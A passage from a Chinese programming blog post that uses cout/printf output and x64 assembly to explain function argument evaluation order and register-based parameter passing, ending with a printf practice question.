<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">---------------------------- test cout ----------------------------</span><br><span class="line">before:0</span><br><span class="line">update():1 i:0</span><br><span class="line">later:1</span><br><span class="line">before:1</span><br><span class="line">i:2 update():2</span><br><span class="line">later:2</span><br><span class="line">update1:5 update2:4 update3:3</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="汇编层面的解释"><a href="#汇编层面的解释" class="headerlink" title="汇编层面的解释"></a>汇编层面的解释</h2><p>为什么会这样,这就必须说起c和c++中关于函数传参的过程了:</p>
<p>在汇编中函数传参要从最后一个参数到第一个参数分别入栈，这样函数取参数的时候，pop出来的顺序才是1-n。</p>
<p>因此,在<code>printf(&quot;update():%d i:%d\n&quot;,update(),i);</code>中,函数先压入i,再执行update(),将其返回值压入栈。</p>
<p>以上只是理论，真实的环境中由x86,x64,32位,16位机,它们的具体的传参方式略有不同:)  </p>
<p>我们来看一下x64下这一条语句的汇编代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov     ebx, cs:i</span><br><span class="line">call    _Z6updatev      ; update(void)</span><br><span class="line">mov     r8d, ebx</span><br><span class="line">mov     edx, eax</span><br><span class="line">lea     rcx, aUpdateDID ; &quot;update():%d i:%d\n&quot;</span><br><span class="line">call    _ZL6printfPKcz  ; printf(char const*,...)</span><br></pre></td></tr></table></figure>


<p>在X64下,是寄存器传参. 前4个参数分别是 rcx rdx r8 r9进行传参.多余的通过栈传参.从右向左入栈。</p>
<p>上述代码中 格式化字符串在rcx中(最后一个赋值),update()返回值在edx,中第二个赋值。i在r8中第一个赋值 。</p>
<p>但是我们可以看到<code>mov     ebx, cs:i</code>程序先将i的值移动到ebx中，再调用update函数,将返回值所在寄存器eax移动到edx中。</p>
<p>虽然过程有点变化,但是最后的结果还是和在汇编中函数传参要从最后一个参数到第一个参数分别入栈。</p>
<h2 id="来练习一下吧"><a href="#来练习一下吧" class="headerlink" title="来练习一下吧"></a>来练习一下吧</h2><p>最后上一个题目吧//</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> a = <span class="number">1</span>, b = <span class="number">2</span>, c = <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d\n&quot;</span>, a,b,c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>求输出</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u014713819/article/details/29355455">答案和解析</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/%E7%94%B1cout%E5%92%8Cprintf%E6%9D%A5%E5%AF%B9%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E8%BF%87%E7%A8%8B%E7%9A%84%E6%8E%A2%E8%AE%A8/" data-id="cku89gxvx007uwvos09ex65wu" data-title="由cout和printf来对函数传参过程的探讨" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/htb/" rel="tag">htb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/LFI/" style="font-size: 10px;">LFI</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 11.67px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 15px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/htb/" style="font-size: 10px;">htb</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 11.67px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 16.67px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">出题笔记</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">域渗透</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 10px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/10/01/real%20world%20ctf%202020/">real world ctf 2020</a>
          </li>
        
          <li>
            <a href="/2021/10/01/roarctf2019/">roarctf2019</a>
          </li>
        
          <li>
            <a href="/2021/10/01/sctf2020/">sctf2020</a>
          </li>
        
          <li>
            <a href="/2021/10/01/tctf2020/">tctf2020</a>
          </li>
        
          <li>
            <a href="/2021/10/01/tp5rce%E5%A4%8D%E7%8E%B0/">tp5rce复现</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2021 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>